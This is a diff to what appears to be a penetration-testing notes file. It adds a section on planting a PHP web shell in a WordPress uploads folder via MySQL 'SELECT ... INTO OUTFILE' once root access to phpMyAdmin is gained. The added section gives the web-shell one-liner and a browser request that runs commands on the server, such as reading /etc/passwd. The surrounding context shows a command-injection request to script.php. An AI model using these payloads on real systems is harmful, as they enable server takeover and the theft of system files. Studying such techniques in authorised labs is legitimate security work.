@@ -29,3 +29,17 @@ GET /script.php?c=ping+192.168.139.130+-c+5&ok=ok HTTP/1.1
 ```
 
 
+
+## Gaining a reverse shell from SQL injection
+
+Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.
+
+```mysql
+Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
+```
+
+Now code can be executed from the browser: 
+
+```
+https://192.168.56.108:12380/blogblog/wp-content/uploads/shell.php?cmd=cat+/etc/passwd
+```
